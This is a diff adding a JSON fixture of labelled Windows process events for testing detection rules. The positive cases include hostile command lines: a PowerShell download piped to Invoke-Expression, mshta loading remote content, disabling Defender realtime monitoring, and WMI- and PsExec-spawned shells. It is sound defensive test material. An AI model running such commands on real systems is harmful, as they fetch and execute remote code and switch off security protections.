@@ -1,0 +1,110 @@
+[
+  {
+    "rule": "powershell_download_and_execute",
+    "expected": true,
+    "event": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "CommandLine": "powershell.exe -Command Invoke-WebRequest https://example.invalid/a.ps1 | Invoke-Expression"
+    }
+  },
+  {
+    "rule": "powershell_download_and_execute",
+    "expected": false,
+    "event": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "CommandLine": "powershell.exe -File C:\\Admin\\inventory.ps1"
+    }
+  },
+  {
+    "rule": "wmi_spawned_command_shell",
+    "expected": true,
+    "event": {
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "CommandLine": "cmd.exe /c whoami"
+    }
+  },
+  {
+    "rule": "wmi_spawned_command_shell",
+    "expected": false,
+    "event": {
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "CommandLine": "cmd.exe /c echo maintenance"
+    }
+  },
+  {
+    "rule": "psexec_service_child_shell",
+    "expected": true,
+    "event": {
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "ParentImage": "C:\\Windows\\PSEXESVC.exe",
+      "CommandLine": "cmd.exe /c hostname"
+    }
+  },
+  {
+    "rule": "psexec_service_child_shell",
+    "expected": false,
+    "event": {
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "ParentImage": "C:\\Windows\\System32\\services.exe",
+      "CommandLine": "cmd.exe /c hostname"
+    }
+  },
+  {
+    "rule": "defender_preference_tampering",
+    "expected": true,
+    "event": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+    }
+  },
+  {
+    "rule": "defender_preference_tampering",
+    "expected": false,
+    "event": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "CommandLine": "powershell.exe Get-MpPreference"
+    }
+  },
+  {
+    "rule": "mshta_remote_content",
+    "expected": true,
+    "event": {
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "CommandLine": "mshta.exe https://example.invalid/update.hta"
+    }
+  },
+  {
+    "rule": "mshta_remote_content",
+    "expected": false,
+    "event": {
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "CommandLine": "mshta.exe C:\\Windows\\Help\\local.hta"
+    }
+  },
+  {
+    "rule": "scheduled_task_shell_payload",
+    "expected": true,
+    "event": {
+      "Image": "C:\\Windows\\System32\\schtasks.exe",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "schtasks.exe /create /tn UpdateCheck /sc daily /tr powershell.exe -File C:\\ProgramData\\check.ps1"
+    }
+  },
+  {
+    "rule": "scheduled_task_shell_payload",
+    "expected": false,
+    "event": {
+      "Image": "C:\\Windows\\System32\\schtasks.exe",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "CommandLine": "schtasks.exe /query /tn UpdateCheck"
+    }
+  }
+]
